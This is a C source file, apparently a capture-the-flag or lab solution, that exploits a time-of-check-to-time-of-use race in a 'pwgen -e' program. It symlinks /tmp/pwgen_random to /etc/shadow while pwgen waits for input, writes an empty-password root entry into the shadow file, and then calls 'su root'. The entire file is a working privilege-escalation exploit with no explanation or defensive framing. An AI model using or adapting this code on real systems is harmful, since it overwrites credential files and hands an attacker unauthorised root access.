#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

// TOCTTOU
int main(int argc, char const *argv[])
{
  char exploitStr[] = "\nroot::::::::";

	FILE *pwgen;
	pwgen = popen("pwgen -e","w");

  // while pwgen is waiting for input, link /tmp/pwgen_random to /etc/shadow
	remove("/tmp/pwgen_random");
	symlink("/etc/shadow","/tmp/pwgen_random");

  // override root user authentication
	fprintf(pwgen, exploitStr);
	fclose(pwgen);

	system("su root");

	return 0;
}